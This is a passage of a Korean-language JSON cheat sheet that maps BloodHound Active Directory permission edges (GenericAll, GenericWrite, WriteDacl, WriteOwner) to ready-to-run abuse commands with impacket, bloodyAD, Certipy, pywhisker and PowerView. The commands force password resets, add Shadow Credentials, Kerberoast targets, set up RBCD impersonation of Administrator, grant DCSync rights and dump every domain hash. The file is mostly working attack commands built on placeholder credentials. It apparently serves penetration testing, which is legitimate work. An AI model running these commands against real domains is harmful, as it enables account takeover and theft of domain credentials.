{
  "_meta": {
    "description": "BloodHound(bloodhound-python) 결과의 AD 권한상승 엣지를 실제 악용 도구/명령으로 매핑",
    "note": "cmd 예시는 'corp.local' 도메인, 공격자 'attacker:Passw0rd!', DC 'dc01' 기준. 상황에 맞게 치환.",
    "impacket_prefix": "Kali 기준 impacket-xxx / 소스는 xxx.py",
    "last_reviewed": "2026-08"
  },

  "edges": {
    "GenericAll": {
      "ko": "대상 객체 완전 제어 (모든 권한)",
      "priority": "high",
      "summary": "대상이 무엇이냐에 따라: 사용자=비번 리셋/Shadow Cred, 그룹=멤버 추가, 컴퓨터=RBCD/LAPS, 도메인=DCSync.",
      "abuse": [
        {
          "when": "대상이 사용자(User)",
          "steps": ["비밀번호 강제 변경(가장 확실)", "또는 Shadow Credentials(로그오프 불필요)", "또는 targeted Kerberoast(비번 안 바꿈)"],
          "cmd": [
            "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01",
            "impacket-changepasswd 'corp.local/TARGETUSER'@dc01 -newpass 'NewPass123!' -altuser 'corp.local/attacker' -altpass 'Passw0rd!' -reset",
            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set password TARGETUSER 'NewPass123!'",
            "certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account TARGETUSER",
            "targetedKerberoast.py -v -d corp.local -u attacker -p 'Passw0rd!' --request-user TARGETUSER"
          ]
        },
        {
          "when": "대상이 그룹(Group)",
          "steps": ["자신을 그룹에 추가 (예: 대상이 특권그룹이면 즉시 상승)"],
          "cmd": [
            "net rpc group addmem 'TARGET GROUP' attacker -U 'corp.local/attacker%Passw0rd!' -S dc01",
            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember 'TARGET GROUP' attacker",
            "PowerView> Add-DomainGroupMember -Identity 'TARGET GROUP' -Members attacker"
          ]
        },
        {
          "when": "대상이 컴퓨터(Computer)",
          "steps": ["RBCD로 SYSTEM 임퍼소네이션", "또는 Shadow Credentials", "또는 LAPS 비번 읽기"],
          "cmd": [
            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
            "certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account 'TARGET$'"
          ]
        }
      ],
      "tools": [
        {"name": "impacket (changepasswd/rbcd)", "type": "py", "url": "https://github.com/fortra/impacket"},
        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
        {"name": "Certipy (shadow)", "type": "py", "url": "https://github.com/ly4k/Certipy"},
        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"},
        {"name": "targetedKerberoast.py", "type": "py", "url": "https://github.com/ShutdownRepo/targetedKerberoast"}
      ]
    },

    "GenericWrite": {
      "ko": "대상 객체 속성 쓰기 가능",
      "priority": "high",
      "summary": "SPN 추가(targeted Kerberoast), Shadow Credentials, logonscript 설정, 컴퓨터면 RBCD 로 상승.",
      "abuse": [
        {
          "when": "대상이 사용자(User)",
          "steps": ["임시 SPN 추가 -> Kerberoast -> 해시 크랙 (비번 안 바꿔 은밀)", "또는 Shadow Credentials"],
          "cmd": [
            "targetedKerberoast.py -v -d corp.local -u attacker -p 'Passw0rd!' --request-user TARGETUSER",
            "pywhisker -d corp.local -u attacker -p 'Passw0rd!' --target TARGETUSER --action add",
            "PowerView> Set-DomainObject -Identity TARGETUSER -Set @{serviceprincipalname='fake/svc'}"
          ]
        },
        {
          "when": "대상이 컴퓨터(Computer)",
          "steps": ["msDS-AllowedToActOnBehalfOfOtherIdentity 설정(RBCD) -> getST 임퍼소네이션"],
          "cmd": [
            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass'"
          ]
        }
      ],
      "tools": [
        {"name": "targetedKerberoast.py", "type": "py", "url": "https://github.com/ShutdownRepo/targetedKerberoast"},
        {"name": "pyWhisker / Whisker", "type": "py", "url": "https://github.com/ShutdownRepo/pywhisker"},
        {"name": "impacket rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"},
        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
      ]
    },

    "WriteDacl": {
      "ko": "대상 객체의 ACL(권한 목록) 수정 가능",
      "priority": "high",
      "summary": "자신에게 GenericAll/DCSync 권한을 부여해 장악. 도메인 대상이면 곧바로 DCSync 권한 획득.",
      "abuse": [
        {
          "when": "대상이 도메인(Domain)",
          "steps": ["자신에게 DCSync(GetChanges/All) 권한 부여 -> 전체 해시 덤프"],
          "cmd": [
            "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'",
            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add dcsync attacker",
            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"
          ]
        },
        {
          "when": "대상이 사용자/그룹/컴퓨터",
          "steps": ["대상에 FullControl 부여 후 해당 GenericAll 기법 사용"],
          "cmd": [
            "impacket-dacledit -action write -rights FullControl -principal attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
            "PowerView> Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All"
          ]
        }
      ],
      "tools": [
        {"name": "impacket dacledit.py", "type": "py", "url": "https://github.com/fortra/impacket"},
        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
        {"name": "PowerView Add-DomainObjectAcl", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
      ]
    },

    "WriteOwner": {
      "ko": "대상 객체의 소유자 변경 가능",
      "priority": "high",
      "summary": "소유자를 자신으로 바꾸면 WriteDacl 획득 -> GenericAll 로 이어짐.",
      "abuse": [
        {
          "when": "모든 대상",
          "steps": ["소유자를 attacker 로 변경", "이어서 WriteDacl 로 FullControl 부여", "GenericAll 기법 진행"],
          "cmd": [
            "impacket-owneredit -action write -new-owner attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
            "impacket-dacledit -action write -rights FullControl -principal attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set owner TARGET attacker"
          ]
        }
      ],
      "tools": [
        {"name": "impacket owneredit/dacledit", "type": "py", "url": "https://github.com/fortra/impacket"},
        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
        {"name": "PowerView Set-DomainObjectOwner", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
      ]
    },

